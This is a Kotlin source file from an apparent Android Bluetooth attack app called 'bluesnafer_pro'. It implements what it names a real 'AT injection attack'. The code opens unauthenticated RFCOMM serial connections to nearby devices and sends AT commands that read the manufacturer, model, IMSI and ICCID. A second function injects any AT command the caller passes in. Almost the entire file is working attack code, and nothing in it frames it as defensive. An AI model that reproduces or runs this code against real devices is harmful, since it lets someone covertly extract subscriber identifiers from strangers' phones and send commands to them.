package com.bluesnafer_pro

import android.bluetooth.*
import android.util.Log
import java.io.*
import java.util.*
import java.util.concurrent.Executors

/**
 * Real AT Injection implementation
 * Sends AT commands via RFCOMM serial connection
 */
object RealATInjection {
    private const val TAG = "RealATInjection"
    private val executor = Executors.newCachedThreadPool()
    
    /**
     * Execute AT injection attack - REAL implementation
     * Connects via RFCOMM and sends AT commands
     */
    fun executeATInjectionAttack(device: BluetoothDevice): Map<String, Any> {
        Log.d(TAG, "AT Injection Attack - connecting to ${device.address}")
        
        return try {
            // Try to connect to a serial port profile (SPP) or use direct AT commands
            val sppUUID = UUID.fromString("00001101-0000-1000-8000-00805F9B34FB")
            
            val socket = device.createInsecureRfcommSocketToServiceRecord(sppUUID)
            socket.connect()
            Log.d(TAG, "RFCOMM connected for AT commands")
            
            val input = socket.inputStream
            val output = socket.outputStream
            
            // Send basic AT command to test
            val atCommand = "AT\r\n".toByteArray(Charsets.UTF_8)
            output.write(atCommand)
            output.flush()
            
            Thread.sleep(500)
            
            // Read response
            val response = ByteArray(1024)
            val bytesRead = input.read(response)
            
            val results = mutableListOf<Map<String, Any>>()
            
            if (bytesRead > 0) {
                val responseStr = String(response, 0, bytesRead, Charsets.UTF_8)
                Log.d(TAG, "AT Response: $responseStr")
                
                results.add(mapOf(
                    "command" to "AT",
                    "response" to responseStr.trim(),
                    "success" to responseStr.contains("OK")
                ))
            }
            
            // Try some informative AT commands
            val infoCommands = listOf(
                "AT+CGMI" to "Manufacturer",
                "AT+CGMM" to "Model",
                "AT+CGMR" to "Revision",
                "AT+CIMI" to "IMSI",
                "AT+CCID" to "ICCID"
            )
            
            for ((cmd, desc) in infoCommands) {
                try {
                    output.write((cmd + "\r\n").toByteArray(Charsets.UTF_8))
                    output.flush()
                    Thread.sleep(300)
                    
                    val resp = ByteArray(512)
                    val len = input.read(resp)
                    if (len > 0) {
                        val result = String(resp, 0, len, Charsets.UTF_8)
                        results.add(mapOf(
                            "command" to cmd,
                            "description" to desc,
                            "response" to result.trim(),
                            "success" to true
                        ))
                    }
                } catch (e: Exception) {
                    // Command not supported
                }
            }
            
            socket.close()
            
            mapOf(
                "success" to true,
                "response" to "AT commands sent successfully",
                "results" to results,
                "count" to results.size
            )
        } catch (e: Exception) {
            Log.e(TAG, "AT Injection error: ${e.message}")
            mapOf(
                "success" to false,
                "response" to "AT Injection failed: ${e.message}",
                "results" to emptyList<Map<String, Any>>()
            )
        }
    }
    
    /**
     * Inject specific AT command
     */
    fun inject(device: BluetoothDevice, command: String, onLog: (String) -> Unit): Map<String, Any> {
        Log.d(TAG, "AT Injection - command: $command")
        onLog("[AT] Injecting command: $command")
        
        return try {
            val sppUUID = UUID.fromString("00001101-0000-1000-8000-00805F9B34FB")
            
            val socket = device.createInsecureRfcommSocketToServiceRecord(sppUUID)
            socket.connect()
            onLog("[AT] ✓ Connected for AT commands")
            
            val input = socket.inputStream
            val output = socket.outputStream
            
            // Send the AT command
            val atCmd = if (command.startsWith("AT")) command else "AT+$command"
            if (!atCmd.endsWith("\r\n")) {
                output.write((atCmd + "\r\n").toByteArray(Charsets.UTF_8))
            } else {
                output.write(atCmd.toByteArray(Charsets.UTF_8))
            }
            output.flush()
            
            onLog("[AT] Command sent, waiting for response...")
            Thread.sleep(500)
            
            // Read response
            val response = ByteArray(2048)
            val bytesRead = input.read(response)
            
            if (bytesRead > 0) {
                val responseStr = String(response, 0, bytesRead, Charsets.UTF_8)
                onLog("[AT] Response: $responseStr")
                
                socket.close()
                return mapOf(
                    "success" to responseStr.contains("OK"),
                    "response" to responseStr.trim()
                )
            }
            
            socket.close()
            onLog("[AT] ✗ No response received")
            mapOf("success" to false, "response" to "No response")
        } catch (e: Exception) {
            Log.e(TAG, "AT inject error: ${e.message}")
            onLog("[AT] ✗ Error: ${e.message}")
            mapOf("success" to false, "response" to (e.message ?: "Unknown error"))
        }
    }
}
